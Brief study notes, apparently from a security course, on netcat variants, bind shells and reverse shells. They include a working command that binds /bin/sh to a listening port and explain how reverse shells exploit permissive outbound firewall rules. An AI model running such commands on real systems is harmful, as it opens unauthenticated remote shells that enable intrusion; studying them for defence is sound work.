#9-11

    which nc
    file /usr/bin/nc

nc versions:
* openbsd (the one that's not dangerous and therefore not fun)
* traditional
* gnu

Opening a port on moxie:

    nc -vvl -p <portNum> -e /bin/sh

Quick Basics:
* Must be on pulic IP's
* Watch out for firewalls (they'll kill this nc ability)

Cannot open a port **below 1024** without sudo

Reverse shell makes use that firewalls allow **all** outgoing connections

The injected script to the open port **spawns it's own nc** to where you are hacking from.
